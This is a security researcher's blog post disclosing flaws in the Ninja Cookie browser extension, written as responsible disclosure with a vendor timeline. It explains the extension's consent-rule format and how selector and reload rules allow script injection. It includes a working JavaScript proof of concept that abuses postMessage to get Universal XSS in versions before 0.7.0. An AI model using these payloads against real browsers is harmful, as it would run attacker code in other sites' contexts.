---
categories:
- security
- add-ons
date: 2021-05-04T14:43:42+0200
description: Sloppy security in Ninja Cookie extension led to Universal XSS among
  other issues. Only the biggest issue has been resolved.
lastmod: '2021-05-14 18:37:49'
title: Universal XSS in Ninja Cookie extension
---

The cookie consent screens are really annoying. They attempt to trick you into accepting all cookies, dismissing them without agreeing is made intentionally difficult. A while back I wrote on Twitter than I’m almost at the point of writing a private browser extension to automate the job. And somebody recommended Ninja Cookie extension to me, which from the description seemed perfect for the job.

Now I am generally wary of extensions that necessarily need full access to every website. This is particularly true if these extensions have to interact with the websites in complicated ways. What are the chances that this is implemented securely? So I took a closer look at Ninja Cookie source code, and I wasn’t disappointed. I found several issues in the extension, one even allowing any website to execute JavaScript code in the context of any other website ([Universal XSS](https://en.wikipedia.org/wiki/Cross-site_scripting)).

{{< img src="ninja_cookie.png" width="600" alt="The cookie ninja from the extension’s logo is lying dead instead of clicking on prompts" />}}

As of Ninja Cookie 0.7.0, the Universal XSS vulnerability has been resolved. The other issues remain however, these are exploitable by anybody with access to the Ninja Cookie download server (ninja-cookie.gitlab.io). This seems to be the reason why Mozilla Add-ons currently only offers the rather dated Ninja Cookie 0.2.7 for download, newer versions have been disabled. Chrome Web Store still offers the problematic extension version however. I didn’t check whether extension versions offered for Edge, Safari and Opera browsers are affected.

{{< toc >}}

## How does the extension work?

When it comes to cookie consent screens, the complicating factor is: there are way too many. While there are *some* common approaches, any given website is likely to be “special” in some respect. For my private extension, the idea was having a user interface to create site-specific rules, so that at least on websites I use often things were covered. But Ninja Cookie has it completely automated of course.

So it will download several sets of rules from ninja-cookie.gitlab.io. For example, [cmp.json](https://ninja-cookie.gitlab.io/rules/cmp.json) currently contains the following rule:

{{< highlight json >}}
"cmp/admiral": {
  "metadata": {
    "name": "Admiral",
    "website": "https://www.getadmiral.com/",
    "iab": "admiral.mgr.consensu.org"
  },
  "match": [{
    "type": "check",
    "selector": "[class^='ConsentManager__']"
  }],
  "required": [{
    "type": "cookie",
    "name": "euconsent",
    "missing": true
  }],
  "action": [{
    "type": "hide"
  }, {
    "type": "css",
    "selector": "html[style*='overflow']",
    "properties": {
      "overflow": "unset"
    }
  }, {
    "type": "css",
    "selector": "body[style*='overflow']",
    "properties": {
      "overflow": "unset"
    }
  }, {
    "type": "sleep"
  }, {
    "type": "click",
    "selector": "[class^='ConsentManager__'] [class^='Card__CardFooter'] button:first-of-type"
  }, {
    "type": "sleep"
  }, {
    "type": "checkbox",
    "selector": "[class^='ConsentManager__'] [class^='Toggle__Label'] input"
  }, {
    "type": "sleep"
  }, {
    "type": "click",
    "selector": "[class^='ConsentManager__'] [class^='Card__CardFooter'] button:last-of-type"
  }]
},
{{< /highlight >}}

This is meant to address Admiral cookie consent prompts. There is a `match` clause, making sure that this only applies to the right pages. The `check` rule here verifies that an element matching the given selector exists on the page. The `required` clause contains another rule, checking that a particular cookie is missing. Finally, the `action` clause defines what to do, a sequence of nine rules. There are `css` rules here, applying CSS properties to matching elements. The `click` rules will click buttons, the `checkbox` change check box values.

## Aren’t these rules too powerful?

Now let’s imagine that ninja-cookie.gitlab.io turns malicious. Maybe the vendor decides to earn some extra money, or maybe the repository backing it simply gets compromised. I mean, if someone [planted a backdoor in the PHP repository](https://portswigger.net/daily-swig/backdoor-planted-in-php-git-repository-after-server-hack), couldn’t the same thing happen here as well? Or the user might simply subscribe to a custom rule list which does something else than what’s advertised. How bad would that get?

Looking through the various rule types, the most powerful rule seems to be `script`. As the name implies, this allows running arbitrary JavaScript code in the context of the website. But wait, it has been defused, to some degree! Ninja Cookie might ask you before running a script. It will be something like the following:

> A script from untrusted source asks to be run for Ninja Cookie to complete the cookie banner setup.
>
> Running untrusted script can be dangerous. Do you want to continue ?
>
> Content: '{const e=(window._sp_.config.events||{}).onMessageChoiceSelect;window._sp_.config.events=Object.assign(window._sp_.config.events||{},{onMessageChoiceSelect:function(n,o){12===o&&(document.documentElement.className+=\" __ninja_cookie_options\"),e&&e.apply(this,arguments)}})}'\
> Origin: https://ninja-cookie.gitlab.io/rules/cmp.json

Now this prompt might already be problematic in itself. It relies on the user being able to make an informed decision. Yet most users will click “OK” because they have no idea what this gibberish is and they trust Ninja Cookie. And malicious attackers can always make the script look more trustworthy, for example by adding the line `Trustworthy: yes` to the end. This dialog won’t make it clear that this line is part of the script rather than Ninja Cookie info. Anyway, only custom lists get this treatment, not the vendor’s own rules from ninja-cookie.gitlab.io (trusted lists).

But why even go there? As it turns out, there are easier ways to run arbitrary JavaScript code via Ninja Cookies rules. Did you notice that many rules have a `selector` parameter? Did you just assume that some secure approach like [document.querySelectorAll()](https://developer.mozilla.org/en-US/docs/Web/API/Document/querySelectorAll) is being used here? Of course not, they are using jQuery, [a well-known source of security issues](https://palant.info/2015/08/30/why-you-probably-want-to-disable-jqueryparsehtml-even-though-you-don-t-call-it/).

If one takes that `[class^='ConsentManager__']` selector and replaces it by `<script>alert(location.href)</script>`, jQuery will create an element instead of locating one in the document. And it will have exactly the expected effect: execute arbitrary JavaScript code on any website. No prompts here, the user doesn’t need to accept anything. The code will just execute silently and manipulate the website in any way it likes.

And that’s not the only way. There is the `reload` rule type (aliases: `location`, `redirect`), meant to redirect you to another page. The address of that page can be anything, for example `javascript:alert(location.href)`. Again, this will run arbitrary JavaScript code without asking the user first.

## Can websites mess with this?

It’s bad enough that this kind of power is given to the rules download server. But it gets worse. That website you opened in your browser? Turned out, it could mess with the whole process. As so often, the issue is using [window.postMessage()](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) for communication between content scripts. Up until Ninja Cookie 0.6.3, the extension’s content script contained the following code snippet:

{{< highlight js >}}
window.addEventListener('message', ({data, origin, source}) => {
  if (!data || typeof data !== 'object')
    return;

  if (data.webext !== browser.runtime.id)
    return;

  switch (data.type) {
    case 'load':
      return messageLoad({data, origin, source});
    case 'unload':
      return messageUnload({data, origin, source});
    case 'request':
      return messageRequest({data, origin, source});
    case 'resolve':
    case 'reject':
      return messageReply({data, origin, source});
  }
});
{{< /highlight >}}

A frame or a pop-up window would send a `load` message to the top/opener window. And it would accept `request` messages coming back. That `request` message could contain, you guessed it, rules to be executed. The only “protection” here is verifying that the message sender knows the extension ID. Which it can learn from the `load` message.

So any website could run code like the following:

{{< highlight js >}}
var frame = document.createElement("iframe");
frame.src = "https://example.org/";
window.addEventListener("message", event =>
{
  if (event.data.type == "load")
  {
    event.source.postMessage({
      webext: event.data.webext,
      type: "request",
      message: {
        type: "action.execute",
        data: {
          action: {
            type: "script",
            content: "alert(location.href)"
          },
          options: {},
          metadata: [{list: {trusted: true}}]
        }
      }
    }, event.origin);
  }
});
document.body.appendChild(frame);
{{< /highlight >}}

Here we create a frame pointing to example.org. And once the frame loads and the corresponding extension message is received, a `request` message is sent to execute a `script` action. Wait, didn’t `script` action require user confirmation? No, not for trusted lists. And the message sender here can simply claim that the list is trusted.

So here any website could easily run its JavaScript code in the context of another website. Critical websites like google.com don’t allow framing? No problem, they can still be opened as a pop-up. Slightly more noisy but essentially just as easy to exploit.

This particular issue has been resolved in Ninja Cookie 0.7.0. Only the `load` message is being exchanged between content scripts now. The remaining communication happens via the secure [runtime.sendMessage() API](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/runtime/sendMessage).

## Conclusions

The Universal XSS vulnerability in Ninja Cookie essentially broke down the boundaries between websites, allowing any website to exploit another. This is already really bad. However, while this particular issue has been resolved, the issue of Ninja Cookie rules being way too powerful hasn’t been addressed yet. As long as you rely on someone else’s rules, be it official Ninja Cookie rules or rules from some third-party, you are putting way too much trust in those. If the rules ever turn malicious, they will compromise your entire browsing.

I’ve given the vendor clear and easy to implement recommendations on fixing selector handling and `reload` rules. Why after three months these changes haven’t been implemented is beyond me. I hope that Mozilla will put more pressure on the vendor to address this.

“Fixing” the `script` rules is rather complicated however. I don’t think that there is a secure way to use them, this functionality has to be provided by other means.

## Timeline

* 2021-02-08: Reported the issues via email
* 2021-02-17: Received confirmation with a promise to address the issue ASAP and keep me in the loop
* 2021-04-13: Sent a reminder that none of the issues have been addressed despite two releases, no response
* 2021-04-19: Ninja Cookie 0.7.0 released, addressing Universal XSS but none of the other issues
* 2021-04-27: Noticed Ninja Cookie 0.7.0 release, notified vendor about disclosure date
* 2021-04-27: Notified Mozilla about remaining policy violations in Ninja Cookie 0.7.0